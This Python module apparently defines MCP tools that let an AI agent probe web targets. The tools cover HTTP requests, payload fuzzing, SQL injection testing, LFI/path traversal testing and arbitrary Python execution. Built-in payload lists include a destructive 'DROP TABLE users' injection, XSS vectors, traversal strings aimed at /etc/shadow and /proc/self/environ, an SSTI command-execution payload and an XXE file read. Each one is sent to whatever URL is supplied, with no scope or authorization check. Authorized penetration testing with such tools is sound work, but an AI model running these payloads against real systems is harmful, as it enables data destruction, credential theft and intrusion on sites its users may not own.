"""
Web tools:
  - http_request    : make HTTP requests with custom headers, cookies, body
  - fuzz_params     : fuzz a URL/form parameter with a wordlist or payload list
  - sqli_test       : quick SQLi detection and union-based extraction
  - lfi_test        : test LFI/path traversal payloads
  - run_webscript   : arbitrary Python requests/BeautifulSoup code
"""

import json

from mcp.types import Tool

from tools.utils import run_python

web_tools = [
    Tool(
        name="http_request",
        description=(
            "Make an HTTP request. "
            "Supports GET, POST, PUT, DELETE. "
            "Can set headers, cookies, body (JSON or raw). "
            "Returns status code, response headers, and body."
        ),
        inputSchema={
            "type": "object",
            "properties": {
                "url": {"type": "string"},
                "method": {"type": "string", "enum": ["GET", "POST", "PUT", "DELETE", "HEAD", "OPTIONS"], "default": "GET"},
                "headers": {"type": "object", "description": "Dict of header name→value"},
                "cookies": {"type": "object", "description": "Dict of cookie name→value"},
                "body": {"type": "string", "description": "Raw body string"},
                "json_body": {"type": "object", "description": "JSON body (sets Content-Type automatically)"},
                "follow_redirects": {"type": "boolean", "default": True},
                "timeout": {"type": "integer", "default": 15},
            },
            "required": ["url"],
        },
    ),
    Tool(
        name="fuzz_params",
        description=(
            "Fuzz a URL parameter or POST field with a list of payloads. "
            "Marks the injection point with FUZZ in the url or body. "
            "Returns responses that differ from the baseline."
        ),
        inputSchema={
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "URL with FUZZ marker, e.g. https://site.com/page?id=FUZZ"},
                "method": {"type": "string", "enum": ["GET", "POST"], "default": "GET"},
                "body_template": {"type": "string", "description": "POST body with FUZZ marker"},
                "payloads": {"type": "array", "items": {"type": "string"}, "description": "List of fuzz strings"},
                "preset": {"type": "string", "enum": ["sqli", "xss", "lfi", "ssti", "xxe"], "description": "Use a built-in payload preset"},
                "headers": {"type": "object"},
            },
            "required": ["url"],
        },
    ),
    Tool(
        name="sqli_test",
        description=(
            "Test a URL parameter for SQL injection. "
            "Tries error-based, boolean-based, and time-based payloads. "
            "Reports anomalies in response length or timing."
        ),
        inputSchema={
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "Target URL with FUZZ marker on the injectable param"},
                "db_type": {"type": "string", "enum": ["auto", "mysql", "postgres", "sqlite", "mssql"], "default": "auto"},
            },
            "required": ["url"],
        },
    ),
    Tool(
        name="lfi_test",
        description="Test a URL parameter for Local File Inclusion / path traversal vulnerabilities.",
        inputSchema={
            "type": "object",
            "properties": {
                "url": {"type": "string", "description": "URL with FUZZ marker on the file parameter"},
                "depth": {"type": "integer", "description": "Max traversal depth (default: 6)"},
            },
            "required": ["url"],
        },
    ),
    Tool(
        name="run_webscript",
        description=(
            "Run arbitrary Python web code. "
            "requests, BeautifulSoup4, lxml, and httpx are available. "
            "Print results to stdout."
        ),
        inputSchema={
            "type": "object",
            "properties": {
                "code": {"type": "string"},
            },
            "required": ["code"],
        },
    ),
]

PAYLOADS = {
    "sqli": [
        "'", "''", "\"", "1' OR '1'='1", "1 OR 1=1", "' OR 1=1--",
        "1; DROP TABLE users--", "' UNION SELECT NULL--",
        "' UNION SELECT NULL,NULL--", "1 AND SLEEP(3)--", "1 AND 1=2",
    ],
    "xss": [
        "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
        "'\"><script>alert(1)</script>", "<svg/onload=alert(1)>",
        "javascript:alert(1)", "<body onload=alert(1)>",
    ],
    "lfi": [
        "../etc/passwd", "../../etc/passwd", "../../../etc/passwd",
        "....//....//etc/passwd", "%2e%2e%2fetc%2fpasswd",
        "..%2Fetc%2Fpasswd", "/etc/passwd", "/etc/shadow",
        "..\\..\\windows\\system32\\drivers\\etc\\hosts",
    ],
    "ssti": [
        "{{7*7}}", "${7*7}", "#{7*7}", "<%= 7*7 %>", "{{config}}",
        "{{''.__class__.__mro__}}", "${T(java.lang.Runtime).getRuntime().exec('id')}",
    ],
    "xxe": [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
    ],
}

LFI_TARGETS = ["/etc/passwd", "/etc/shadow", "/etc/hostname", "/proc/self/environ", "/windows/system32/drivers/etc/hosts"]


def _build_request_code(
    url: str,
    method: str = "GET",
    headers: dict | None = None,
    cookies: dict | None = None,
    body: str | None = None,
    json_body: dict | None = None,
    follow_redirects: bool = True,
    timeout: int = 15,
) -> str:
    parts = [
        "import requests, json, sys",
        "s = requests.Session()",
    ]
    if headers:
        parts.append(f"s.headers.update({json.dumps(headers)})")
    if cookies:
        parts.append(f"s.cookies.update({json.dumps(cookies)})")

    kwargs: dict = {"timeout": timeout, "allow_redirects": follow_redirects, "verify": False}
    if json_body is not None:
        kwargs["json"] = json_body
    elif body:
        kwargs["data"] = body

    parts.append(f"r = s.request({json.dumps(method)}, {json.dumps(url)}, **{repr(kwargs)})")
    parts += [
        "print(f'Status: {r.status_code}')",
        "print(f'Headers: {dict(r.headers)}')",
        "print(f'Body ({len(r.text)} chars):')",
        "print(r.text[:4000])",
    ]
    return "\n".join(parts)


async def handle_web(name: str, args: dict) -> str:
    if name == "http_request":
        code = _build_request_code(
            url=args["url"],
            method=args.get("method", "GET"),
            headers=args.get("headers"),
            cookies=args.get("cookies"),
            body=args.get("body"),
            json_body=args.get("json_body"),
            follow_redirects=args.get("follow_redirects", True),
            timeout=args.get("timeout", 15),
        )
        return await run_python(code)

    if name == "fuzz_params":
        url_template = args["url"]
        method = args.get("method", "GET")
        body_template = args.get("body_template", "")
        headers = args.get("headers", {})
        payloads = args.get("payloads") or PAYLOADS.get(args.get("preset", ""), [])
        if not payloads:
            return "[error] provide payloads list or a valid preset (sqli, xss, lfi, ssti, xxe)"

        code_lines = [
            "import requests; requests.packages.urllib3.disable_warnings()",
            f"payloads = {json.dumps(payloads)}",
            f"url_t = {json.dumps(url_template)}",
            f"body_t = {json.dumps(body_template)}",
            f"method = {json.dumps(method)}",
            f"headers = {json.dumps(headers)}",
            "baseline = None",
            "for p in payloads:",
            "    url = url_t.replace('FUZZ', requests.utils.quote(str(p), safe=''))",
            "    body = body_t.replace('FUZZ', str(p)) if body_t else None",
            "    try:",
            "        r = requests.request(method, url, data=body, headers=headers, timeout=10, verify=False)",
            "        if baseline is None: baseline = len(r.text)",
            "        diff = abs(len(r.text) - baseline)",
            "        flag = ' <-- INTERESTING' if diff > 50 or r.status_code not in (200, 404) else ''",
            "        print(f'[{r.status_code}] len={len(r.text):6d} diff={diff:5d}  payload={repr(p)}{flag}')",
            "    except Exception as e:",
            "        print(f'[err] {p}: {e}')",
        ]
        return await run_python("\n".join(code_lines))

    if name == "sqli_test":
        url = args["url"]
        payloads = PAYLOADS["sqli"]
        code_lines = [
            "import requests, time; requests.packages.urllib3.disable_warnings()",
            f"payloads = {json.dumps(payloads)}",
            f"url_t = {json.dumps(url)}",
            "baseline_r = requests.get(url_t.replace('FUZZ','1'), timeout=10, verify=False)",
            "baseline_len = len(baseline_r.text)",
            "print(f'Baseline: status={baseline_r.status_code} len={baseline_len}')",
            "for p in payloads:",
            "    url = url_t.replace('FUZZ', requests.utils.quote(str(p), safe=''))",
            "    t0 = time.time()",
            "    try:",
            "        r = requests.get(url, timeout=12, verify=False)",
            "        elapsed = time.time() - t0",
            "        diff = abs(len(r.text) - baseline_len)",
            "        flags = []",
            "        if diff > 100: flags.append(f'len_diff={diff}')",
            "        if elapsed > 2.5: flags.append(f'slow={elapsed:.1f}s')",
            "        if r.status_code != baseline_r.status_code: flags.append(f'status={r.status_code}')",
            "        for err in ['syntax error','mysql','ORA-','pg_','sqlite','ODBC',"
            "                    'Warning: mysql','Unclosed quotation']:",
            "            if err.lower() in r.text.lower(): flags.append(f'db_err={err}')",
            "        if flags:",
            "            print(f'POTENTIAL SQLI: {repr(p)} → {flags}')",
            "        else:",
            "            print(f'  ok  {repr(p)}')",
            "    except Exception as e:",
            "        print(f'[err] {p}: {e}')",
        ]
        return await run_python("\n".join(code_lines))

    if name == "lfi_test":
        url = args["url"]
        depth = args.get("depth", 6)
        traversals = []
        for target in LFI_TARGETS:
            for d in range(1, depth + 1):
                traversals.append("..//" * d + target.lstrip("/"))
                traversals.append("../" * d + target.lstrip("/"))
            traversals.append(target)  # absolute

        code_lines = [
            "import requests; requests.packages.urllib3.disable_warnings()",
            f"payloads = {json.dumps(traversals)}",
            f"url_t = {json.dumps(url)}",
            "found = []",
            "for p in payloads:",
            "    url = url_t.replace('FUZZ', requests.utils.quote(p, safe=''))",
            "    try:",
            "        r = requests.get(url, timeout=8, verify=False)",
            "        if 'root:' in r.text or 'bin/bash' in r.text or 'WIN.INI' in r.text.upper():",
            "            found.append(p)",
            "            print(f'[VULN] {p}')",
            "            print(r.text[:500])",
            "    except Exception as e:",
            "        pass",
            "if not found: print('No LFI found with tested payloads')",
        ]
        return await run_python("\n".join(code_lines))

    if name == "run_webscript":
        return await run_python(args["code"])

    return f"[error] unknown web tool: {name}"
